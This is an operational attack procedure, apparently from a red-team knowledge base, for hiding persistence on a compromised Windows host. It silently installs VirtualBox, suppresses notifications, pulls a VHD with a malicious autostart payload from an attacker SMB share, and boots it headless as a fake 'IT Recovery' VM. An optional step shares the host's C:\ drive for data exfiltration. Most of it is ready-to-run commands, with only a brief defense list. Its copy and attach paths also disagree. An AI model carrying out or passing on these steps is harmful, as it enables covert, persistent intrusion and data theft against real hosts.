---
id: 9a91e47a-a9d7-496d-8e79-7024a7448c98
name: Windows-VM-Persistence-with-VirtualBox-and-VHD
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.300194+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Boot or Logon Autostart Execution|T1547 - Boot or Logon
    Autostart Execution]]
sub_techniques:
  - >-
    [[sub-techniques/Registry Run Keys / Startup Folder|T1547.001 - Registry Run
    Keys / Startup Folder]]
tags:
  - '[[tags/Elevated]]'
  - '[[tags/Virtual Machines]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/powershell-invoke-webrequest-virtualbox-download]]'
  - '[[commands/virtualbox-silent-install]]'
  - '[[commands/vboxmanage-setextradata-suppress-messages]]'
  - '[[commands/powershell-copy-item-vhd]]'
  - '[[commands/vboxmanage-createvm]]'
  - '[[commands/vboxmanage-storagectl-add-sata]]'
  - '[[commands/vboxmanage-storageattach-vhd]]'
  - '[[commands/vboxmanage-startvm-headless]]'
platforms:
  - Windows
tools:
  - '[[tools/VirtualBox]]'
validated: true
---

# Windows-VM-Persistence-with-VirtualBox-and-VHD

## Summary

This procedure establishes persistence on a compromised Windows host by creating a VirtualBox virtual machine and mounting a pre-configured VHD file containing a malicious executable in the startup folder. Upon booting the VM, the executable runs automatically, allowing attackers to maintain access or execute malicious code within an isolated virtual environment that may evade host-based detection.

## Description

In this technique, an attacker downloads and silently installs VirtualBox on the compromised Windows host, configures a new Windows VM, attaches a VHD disk image (pre-loaded with a Windows OS and a malicious executable placed in the startup folder for autostart execution), and starts the VM in headless mode. The VHD serves as the boot disk, ensuring the malicious payload persists across VM reboots. This approach leverages virtualization to create a hidden layer of persistence, as security tools on the host may not monitor activity inside the guest VM effectively. It is particularly useful in environments where direct host modifications are heavily monitored. The target environment is a Windows host with administrative privileges, and the VHD must be hosted on an attacker-controlled SMB share.

## Requirements

1. Administrative privileges on the Windows host for installing VirtualBox and running VBoxManage.
2. Network access to an SMB share containing the pre-configured VHD file (e.g., shadowbunny.vhd with Windows OS and autostart malicious executable).
3. Sufficient disk space and RAM on the host (at least 2GB recommended for the VM).
4. [[tools/VirtualBox]] installed (handled in this procedure if not present).

## Defense

- Monitor for downloads and installations of virtualization software like VirtualBox on endpoints.
- Implement application whitelisting to block unauthorized executables such as VBoxManage.exe or VirtualBox installers.
- Scan for unusual VM creation events in virtualization logs and restrict admin privileges.
- Network segmentation to block SMB access to suspicious shares and monitor for anomalous disk I/O or process spawning from virtual environments.

## Objectives

1. Install and configure VirtualBox silently to avoid user detection.
2. Create and launch a Windows VM with a persistent malicious payload via autostart.
3. Maintain long-term access through the VM without direct host modifications.

## Instructions

### Step 1: Download VirtualBox Installer

**Context**: Retrieve the VirtualBox installer from the official source to prepare for silent installation on the compromised host.

**Command** ([[commands/powershell-invoke-webrequest-virtualbox-download]]):
```powershell
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
```

> This command downloads the installer to the temp directory. Verify the file exists post-execution to confirm success.

### Step 2: Silently Install VirtualBox

**Context**: Perform a quiet installation to avoid desktop icons or prompts that could alert the user.

**Command** ([[commands/virtualbox-silent-install]]):
```cmd
%TEMP%\VirtualBox-6.1.8-137981-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
```

> Run this from PowerShell or CMD. The installation completes without UI, suppressing shortcuts and reboots. Expected: No errors, VirtualBox in Program Files.

### Step 3: Disable VirtualBox Notifications

**Context**: Suppress GUI messages to prevent any pop-ups during automated operations.

**Command** ([[commands/vboxmanage-setextradata-suppress-messages]]):
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" setextradata global GUI/SuppressMessages "all"
```

> This sets a global extra data flag. Run from the VirtualBox directory or use full path. Expected: No output, but notifications are disabled for subsequent operations.

### Step 4: Download the VHD File

**Context**: Copy the pre-configured VHD (containing Windows OS with malicious autostart executable) from the attacker's SMB share to a local path for VM attachment.

**Command** ([[commands/powershell-copy-item-vhd]]):
```powershell
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
```

> This transfers the VHD over SMB. Ensure SMB connectivity; if credentials needed, use alternate paths or net use. Expected: File copied successfully to the specified directory.

### Step 5: Create the Virtual Machine

**Context**: Register a new VM named "IT Recovery" configured for Windows to host the VHD.

**Command** ([[commands/vboxmanage-createvm]]):
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" createvm --name "IT Recovery" --ostype Windows10_64 --register
```

> This creates and registers the VM. Expected output includes UUID and settings file path, confirming creation.

### Step 6: Configure VM Hardware Settings

**Context**: Set memory, network, audio, and graphics options to ensure the VM runs efficiently in headless mode without unnecessary features.

Run the following VBoxManage commands sequentially:
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "IT Recovery" --ioapic on
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "IT Recovery" --memory 1024 --vram 128
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "IT Recovery" --nic1 nat
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "IT Recovery" --audio none
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "IT Recovery" --graphicscontroller vmsvga
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "IT Recovery" --description "IT Recovery VM"
```

> These enable 64-bit support, allocate resources, use NAT for outbound access, disable audio, set graphics, and add a description. Each command outputs confirmation like "OK".

### Step 7: Add Storage Controller and Attach VHD

**Context**: Create a SATA controller and attach the VHD as the primary hard disk for booting the persistent Windows environment.

**Command** ([[commands/vboxmanage-storagectl-add-sata]]):
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" storagectl "IT Recovery" --name "SATA Controller" --add sata
```

**Command** ([[commands/vboxmanage-storageattach-vhd]]):
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" storageattach "IT Recovery" --storagectl "SATA Controller" --type hdd --medium "%USERPROFILE%\VirtualBox VMs\IT Recovery\shadowbunny.vhd" --port 0
```

> The first adds the controller; the second attaches the VHD at port 0 (boot disk). Expected: "OK" for both, with the VHD mounted.

### Step 8: Start the VM Headless

**Context**: Launch the VM without a GUI to run silently in the background, executing the autostart malicious code.

**Command** ([[commands/vboxmanage-startvm-headless]]):
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm "IT Recovery" --type headless
```

> This starts the VM detached from console. Expected: VM boots, and if configured, connects to attacker's C2 via the payload in the VHD startup folder.

### Step 9: (Optional) Configure Shared Folder for Host-Guest Access

**Context**: If additional file sharing between host and guest is needed, add a shared folder (requires VirtualBox Guest Additions in the VM).

Run:
```cmd
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" sharedfolder add "IT Recovery" --name shadow_c --hostpath C:\\ --automount
```

> Inside the running Windows VM, map the shared folder via net use or Explorer. This allows payload updates or data exfil from guest to host.

For full automation, refer to the script in [[codes/PowerShell-Automate-VirtualBox-VM-Setup-for-Persistence]].

## Expected Output

Successful execution results in a running headless VM with the VHD booted into Windows, where the malicious executable launches automatically from the startup folder, establishing persistent access. Verify via VBoxManage list runningvms (shows "IT Recovery" running) and monitor for payload callbacks.
